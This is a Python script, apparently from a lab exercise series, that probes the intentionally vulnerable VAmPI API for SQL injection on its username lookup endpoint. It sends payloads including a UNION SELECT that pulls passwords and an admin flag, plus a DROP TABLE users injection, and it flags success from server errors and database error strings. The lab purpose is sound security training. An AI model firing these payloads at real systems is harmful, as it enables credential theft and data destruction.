#!/usr/bin/env python3
"""
vampi_challenge_06_sql_injection.py — SQL Injection on GET /users/v1/{username}.

VAmPI builds the user lookup with an f-string:
    user_query = f"SELECT * FROM users WHERE username = '{username}'"
so the username path is injected straight into the SQL. The response for a
valid username is a single {username, email} object, and a tautology like
`' OR '1'='1` is clamped to the first row by the app's fetchone(). The
RELIABLE signals here are therefore:
  * HTTP 500 on an injection payload (the broken query blows up), and/or
  * a SQL/DB error string in the error body (sqlite3 / sqlalchemy / UNION /
    "syntax error" / "You can only execute one statement" / ...), and/or
  * a 200 that returns a DIFFERENT username than requested (row substitution).

We report which signal fired and never print the raw traceback / secrets.
Run: python3 vampi_challenge_06_sql_injection.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


# Substrings that indicate the request hit a broken/injected SQL query.
SQL_ERROR_MARKERS = (
    "sqlite3", "sqlalchemy", "syntax error", "You can only execute one statement",
    "no such column", "SELECTs to the left and right of UNION",
    "OperationalError", "ProgrammingError", "near \"UNION\"",
)


def main():
    ap = argparse.ArgumentParser(description="SQL injection on /users/v1/{username}")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)

    # Baseline: a known-good single-user object.
    r0 = requests.get(f"{base}/users/v1/name1", headers=vc.consumer_headers(806), timeout=tout)
    base_user = (r0.json() or {}).get("username") if r0.status_code == 200 else None
    print(f"baseline  GET /users/v1/name1 -> HTTP {r0.status_code} username={base_user}")

    payloads = [
        "name1' OR '1'='1",
        "name1' OR '1'='1' --",
        "name1'; SELECT * FROM users --",
        "name1' UNION SELECT username,password,email,admin FROM users --",
        "name1' UNION SELECT 1,2,3,4 --",
        "name1' ; DROP TABLE users --",
    ]
    hits = 0
    for p in payloads:
        try:
            r = requests.get(f"{base}/users/v1/{p}", headers=vc.consumer_headers(806), timeout=tout)
        except requests.RequestException as e:
            print(f"payload   {p!r:58} -> error {e}")
            continue

        body = (r.text or "").lower()
        marker = next((m for m in SQL_ERROR_MARKERS if m.lower() in body), None)
        error_500 = r.status_code >= 500
        try:
            d = r.json()
            row_subst = (isinstance(d, dict) and d.get("username")
                         and d.get("username") not in (p, base_user))
        except Exception:
            row_subst = False

        signal = error_500 or marker is not None or row_subst
        if signal:
            hits += 1
        why = []
        if error_500:
            why.append(f"HTTP {r.status_code}")
        if marker:
            why.append(f"error-marker:{marker!r}")
        if row_subst:
            why.append("row-substitution")
        print(f"payload   {p!r:58} -> {'[SIGNAL: ' + ', '.join(why) + ']' if signal else 'HTTP ' + str(r.status_code) + ' clean'}")

    print(f"\nDone — {hits}/{len(payloads)} payload(s) triggered an SQL injection signal.")
    if hits:
        print("[FINDING] username path is concatenated into SQL; injection produces DB errors / altered rows.")
    else:
        print("[ok] no SQL injection signal observed.")


if __name__ == "__main__":
    main()
